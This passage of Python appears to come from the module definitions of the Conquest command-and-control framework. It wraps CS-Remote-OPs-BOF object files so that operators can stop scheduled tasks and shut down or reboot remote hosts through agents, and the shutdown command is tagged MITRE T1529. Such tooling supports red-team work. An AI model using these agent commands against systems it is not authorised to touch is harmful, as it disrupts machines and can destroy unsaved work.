                task := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/schtasksstop/schtasksstop.x64.o",
                params := conquest.bof_pack("ZZ", [
                    server,                 # Z: Target system
                    task                    # Z: Path to task
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("scheduled tasks") 

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_shutdown = ( 
    conquest.createCommand(name="shutdown", description="Shutdown or reboot a target system.", example="shutdown --message \"Goodbye from Conquest\" --in 20 --reboot",
                           message="Tasked agent to shutdown a computer.", mitre=["T1529"])
            .addArgString("target", "Target system (default: local computer).")
            .addFlagString("--message", "message", "Message to display before shutdown (default: none).")
            .addFlagInt("--in", "seconds", "Number of seconds before shutdown/reboot (default: 0).")
            .addFlagBool("--close-apps", "close-apps", "Close all running applications without saving.")
            .addFlagBool("--reboot", "reboot", "Reboot system after shutdown.")
            .addFlagBool("--confirm", "confirm", "Confirm shutdown. This flag acts as a safety net to prevent unwanted shutdowns/reboots")
            .setHandler(lambda agentId, cmdline, args: (
                target := conquest.get_string(args, 0),
                message := conquest.get_string(args, 1),
                seconds := conquest.get_int(args, 2),
                closeApps := conquest.get_bool(args, 3),
                reboot := conquest.get_bool(args, 4),
                confirm := conquest.get_bool(args, 5),

                conquest.error(agentId, "Set the --confirm flag to shutdown the target system.", cmdline) if not confirm
                else (
                    
                    bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/shutdown/shutdown.x64.o",
                    params := conquest.bof_pack("zziss", [
                        target,                 # z: Target system
                        message,                # z: Shutdown message
                        seconds,                # i: Seconds until shutdown
                        int(closeApps),         # s: Close apps without saving
                        int(reboot)             # s: Reboot after shutdown
                    ]),

                    conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
                )
            ))
).registerToGroup("remote operations")